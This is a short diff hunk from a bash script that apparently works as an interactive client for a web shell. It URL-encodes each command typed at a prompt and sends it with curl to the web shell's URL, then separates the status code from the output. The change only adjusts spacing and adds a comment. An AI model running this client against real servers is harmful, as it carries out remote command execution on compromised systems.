@@ -16,7 +16,7 @@ while true; do
 	read -p '$ ' raw_command
 	command=$(printf %s "${raw_command}" | jq -sRr @uri) # for url encoding -s read as single string, R raw mode (no json parse), -r raw output 
 
-	response=$(curl  -s -w "%{http_code}" "${webshell}${command}")
+	response=$(curl -s -w "%{http_code}" "${webshell}${command}") # -w to get more info on the request, once the body received
 	http_code="${response: -3}"
 	body="${response%???}"
 
